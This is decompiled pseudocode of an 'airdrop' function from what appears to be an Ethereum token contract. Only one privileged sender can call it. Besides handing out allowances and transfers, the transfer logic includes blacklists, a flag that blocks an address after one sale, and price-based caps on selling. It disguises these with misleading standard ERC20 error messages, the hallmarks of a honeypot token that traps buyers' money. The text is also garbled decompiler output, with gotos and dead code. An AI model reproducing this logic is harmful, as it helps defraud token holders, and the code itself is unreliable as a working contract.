function airdrop(address[] varg0, address[] varg1) public payable { 

    require(4 + (msg.data.length - 4) - 4 >= 64);

    require(varg0 <= 0xffffffffffffffff);

    require(4 + varg0 + 31 < 4 + (msg.data.length - 4));

    v0 = v1 = varg0.data;

    require(varg0.length <= 0xffffffffffffffff, Panic(65)); // failed memory allocation (too much memory)

    v2 = new uint256[](varg0.length);

    require(!((v2 + ((varg0.length << 5) + 32 + 31 & ~0x1f) > 0xffffffffffffffff) | (v2 + ((varg0.length << 5) + 32 + 31 & ~0x1f) < v2)), Panic(65)); // failed memory allocation (too much memory)

    v3 = v4 = v2.data;

    require(v1 + (varg0.length << 5) <= 4 + (msg.data.length - 4));

    v5 = v6 = 0;

    while (v5 < varg0.length) {

        0x3d10(msg.data[v0]);

        MEM[v3] = msg.data[v0];

        v3 = v3 + 32;

        v0 = v0 + 32;

        v5 = v5 + 1;

    }

    require(varg1 <= 0xffffffffffffffff);

    require(4 + varg1 + 31 < 4 + (msg.data.length - 4));

    v7 = v8 = varg1.data;

    require(varg1.length <= 0xffffffffffffffff, Panic(65)); // failed memory allocation (too much memory)

    v9 = new uint256[](varg1.length);

    require(!((v9 + ((varg1.length << 5) + 32 + 31 & ~0x1f) > 0xffffffffffffffff) | (v9 + ((varg1.length << 5) + 32 + 31 & ~0x1f) < v9)), Panic(65)); // failed memory allocation (too much memory)

    v10 = v11 = v9.data;

    require(v8 + (varg1.length << 5) <= 4 + (msg.data.length - 4));

    v12 = v13 = 0;

    while (v12 < varg1.length) {

        0x3d10(msg.data[v7]);

        MEM[v10] = msg.data[v7];

        v10 = v10 + 32;

        v7 = v7 + 32;

        v12 = v12 + 1;

    }

    require(msg.sender == _set_max);

    v14 = v15 = 0;

    while (1) {

        if (v14 >= v2.length) {

            goto 0x127bB0x30d;

        }

        v16 = _SafeMul(2, _totalSupply);

        v17 = _SafeDiv(v16, 100);

        require(v14 < v2.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice

        _allowance[stor_6_0_19][address(v2[v14])] = v17;

        v18 = v19 = 4598;

        v20 = v21 = stor_6_0_19;

        require(v14 < v2.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice

        v22 = v23 = v2[v14];

        v24 = _SafeMul(2, _totalSupply);

        v25 = v26 = _SafeDiv(v24, 100);

        if (!uint8(owner_b[address(address(msg.sender))])) {

            break;

        }

        require(!uint8(owner_b[address(address(msg.sender))]));

        v27 = new uint256[](2);

        if (2) {

            CALLDATACOPY(v27.data, msg.data.length, 64);

        }

        v28 = v29 = address(v20) == _view_pair;

        if (v29) {

            v28 = v30 = !uint8(owner_d[address(address(v22))]);

        }

        if (!v28) {

            v28 = v31 = uint8(owner_d[address(address(v20))]);

            if (v31) {

                v28 = address(v22) != _view_pair;

            }

        }

        if (!v28) {

            if (!uint8(owner_c[address(address(v20))])) {

                v32 = v33 = !uint8(owner_b[address(address(v20))]);

                if (!bool(uint8(owner_b[address(address(v20))]))) {

                    v32 = !uint8(owner_b[address(address(v22))]);

                }

                require(v32, Error('ERC20: transfer from the zero address'));

                v34 = v35 = address(v22) == _view_pair;

                if (v35) {

                    v34 = v36 = !uint8(owner_d[address(address(v20))]);

                }

                if (!v34) {

                    v34 = v37 = uint8(owner_d[address(address(v22))]);

                    if (v37) {

                        v34 = address(v20) != _view_pair;

                    }

                }

                if (v34) {

                    require(!uint8(owner_a[address(address(v20))]), Error('ERC20: transfer is still pending'));

                    require(0 < v27.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice

                    v38 = v27.data;

                    v27[0] = stor_10_0_19;

                    require(1 < v27.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice

                    v27[1] = stor_f_0_19;

                    MEM[MEM[64]] = 0xd06ca61f00000000000000000000000000000000000000000000000000000000;

                    MEM[4 + MEM[64] + 0] = v25;

                    MEM[4 + MEM[64] + 32] = 64;

                    MEM[4 + MEM[64] + 64] = v27.length;

                    v39 = v40 = 4 + MEM[64] + 64 + 32;

                    v41 = v42 = v27.data;

                    v43 = v44 = 0;

                    while (v43 < v27.length) {

                        MEM[v39] = address(MEM[v41]);

                        v39 = v39 + 32;

                        v41 = v41 + 32;

                        v43 = v43 + 1;

                    }

                    require(bool(owner_14_0_19.code.size));

                    v45 = owner_14_0_19.staticcall(MEM[(MEM[64]) len (v39 - MEM[64])], MEM[(MEM[64]) len 0]).gas(msg.gas);

                    require(bool(v45), 0, RETURNDATASIZE()); // checks call status, propagates error data on error

                    RETURNDATACOPY(MEM[64], 0, RETURNDATASIZE());

                    v46 = 0x2e5a(MEM[64], MEM[64] + RETURNDATASIZE());

                    require(1 < v46.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice

                    require(stor_f_20_20 >= uint8(2), Panic(17)); // arithmetic overflow or underflow

                    v47 = 0x365f(10, uint8(stor_f_20_20 - uint8(2)));

                    v48 = _SafeMul(1, v47);

                    v49 = _SafeMul(v48, stor_5);

                    require(v46[32][32][32][1] <= v49, Error('ERC20: transfer amount exceeds balance'));

                    v50 = _SafeMul(owner_9[address(v20)], 12);

                    v51 = _SafeDiv(v50, 10);

                    require(v46[32][32][32][1] <= v51, Error('ERC20: transfer amount exceeds balance'));

                    owner_a[address(v20)] = 0x1 | bytes31(owner_a[address(address(v20))]);

                }

            }

        } else {

            v52 = v53 = !uint8(owner_b[address(address(v20))]);

            if (!bool(uint8(owner_b[address(address(v20))]))) {

                v52 = !uint8(owner_b[address(address(v22))]);

            }

            require(v52, Error('ERC20: transfer from the blacklisted address'));

            require(0 < v27.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice

            v54 = v27.data;

            v27[0] = stor_f_0_19;

            require(1 < v27.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice

            v27[1] = stor_10_0_19;

            MEM[MEM[64]] = 0x1f00ca7400000000000000000000000000000000000000000000000000000000;

            MEM[4 + MEM[64] + 0] = v25;

            MEM[4 + MEM[64] + 32] = 64;

            MEM[4 + MEM[64] + 64] = v27.length;

            v55 = v56 = 4 + MEM[64] + 64 + 32;

            v57 = v58 = v27.data;

            v59 = v60 = 0;

            while (v59 < v27.length) {

                MEM[v55] = address(MEM[v57]);

                v55 = v55 + 32;

                v57 = v57 + 32;

                v59 = v59 + 1;

            }

            require(bool(owner_14_0_19.code.size));

            v61 = owner_14_0_19.staticcall(MEM[(MEM[64]) len (v55 - MEM[64])], MEM[(MEM[64]) len 0]).gas(msg.gas);

            require(bool(v61), 0, RETURNDATASIZE()); // checks call status, propagates error data on error

            RETURNDATACOPY(MEM[64], 0, RETURNDATASIZE());

            v62 = 0x2e5a(MEM[64], MEM[64] + RETURNDATASIZE());

            require(0 < v62.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice

            v63 = v62.data;

            v64 = _SafeAdd(owner_9[address(v22)], v62[0][0]);

            owner_9[address(v22)] = v64;

            if (map_e[address(v22)] == 0) {

                map_e[address(v22)] = block.number;

            }

        }

        v65 = v66 = address(v20) == owner_14_0_19;

        if (v66) {

            v65 = address(v22) != _view_pair;

        }

        if (v65) {

            require(uint8(owner_c[address(address(v22))]), Error('sth wrong'));

        }

        v67 = _SafeSub('ERC20: transfer amount exceeds balance', v25, _balanceOf[address(v20)]);

        _balanceOf[address(v20)] = v67;

        v68 = _SafeAdd(_balanceOf[address(v22)], v25);

        _balanceOf[address(v22)] = v68;

        MEM[MEM[64] + 0] = v25;

        emit Transfer(address(v20), address(v22));

        goto {'0x11f6B0x30d', '0x13aaB0x30d'};

        require(v14 < v2.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice

        owner_c[address(v2[v14])] = 0x1 | bytes31(owner_c[address(address(v2[v14]))]);

        v14 = 0x3950(v14);

        continue;

        v14 = 0x3950(v14);

        goto 0x127fB0x30d;

        v14 = v69 = 0;

        if (v14 >= v9.length) {

            exit;

        } else {

            v70 = _SafeDiv(_totalSupply, 1000);

            require(v14 < v9.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice

            _allowance[stor_6_0_19][address(v9[v14])] = v70;

            v18 = v71 = 5034;

            v20 = v72 = stor_6_0_19;

            require(v14 < v9.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice

            v22 = v73 = v9[v14];

            v25 = v74 = _SafeDiv(_totalSupply, 1000);

        }

    }

}
